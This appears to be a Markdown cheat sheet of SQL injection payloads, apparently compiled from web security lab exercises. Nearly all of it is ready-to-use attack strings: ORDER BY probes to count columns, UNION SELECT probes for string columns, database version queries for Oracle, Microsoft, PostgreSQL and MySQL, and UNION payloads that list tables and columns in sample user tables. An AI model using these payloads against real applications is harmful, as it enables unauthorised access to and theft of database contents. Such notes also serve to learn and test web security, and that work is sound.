# SQL Injection

### How to check column in table query

Injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.
```
' ORDER BY 1 -- 
' ORDER BY 2 --
' ORDER BY 3 --
```

### Finding columns with a useful data type

Having already determined the number of required columns, you can probe each column to test whether it can 
hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.
```
' UNION SELECT ‘a’,NULL,NULL,NULL --
' UNION SELECT NULL,’a’,NULL,NULL -- 
' UNION SELECT NULL,NULL,’a’,NULL --
' UNION SELECT NULL,NULL,NULL,’a’ --
```

## Database version
### You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

- Oracle: 	`SELECT banner FROM v$version` or `SELECT version FROM v$instance`
  > Example: `' UNION SELECT banner,NULL FROM v$version--`
- Microsoft: 	`SELECT @@version`
- PostgreSQL: 	`SELECT version()` 
  > Example: `'+UNION+SELECT+version()+,NULL--`
- MySQL: 	`SELECT @@version`

## Database contents
### You can list the tables that exist in the database, and the columns that those tables contain.

- Oracle
  - `SELECT * FROM all_tables`
    > Example: `' UNION SELECT TABLE_NAME,NULL FROM all_tables--`
    >> *table_name* is a sql_identifier that displays the name(s) of the table(s)
  - `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
    > Example: `' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_QQGUCL'--`
    >> *column_name* is a	sql_identifier that displays the name(s) of the column(s) under a specified table 
- Microsoft	
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
- PostgreSQL	
  - `SELECT * FROM information_schema.tables`
    > Example: `' UNION SELECT table_name,NULL FROM information_schema.tables--` 
    >> *table_name* is a sql_identifier that displays the name(s) of the table(s)
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` 
    > Example: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_jrcoia'--`
    >> *column_name* is a	sql_identifier that displays the name(s) of the column(s) under a specified table 
- MySQL	
  - `SELECT * FROM information_schema.tables`
  - `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

